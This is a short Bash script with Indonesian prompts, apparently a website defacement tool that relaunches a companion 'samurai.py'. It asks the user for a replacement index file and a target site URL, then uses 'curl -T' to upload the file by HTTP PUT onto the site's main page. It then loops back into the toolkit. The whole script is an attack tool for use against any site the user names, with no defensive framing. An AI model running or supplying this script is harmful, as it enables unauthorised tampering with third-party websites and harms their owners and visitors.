#bapak
clear
echo "Tebas aja"
echo
echo "file index harus berada di luar folder"
read -p "file>> " file
echo
echo "url website eg: https://google.com"
read -p "url halaman utama>> " host
echo
echo "eksekusi..."
sleep 1
curl -T /sdcard/$file $host
echo "saya tidak tahu berhasil atau tidak"
echo "coba cek"$host
echo
echo
echo "mengulang program dalam 10 detik"
sleep 9
python samurai.py
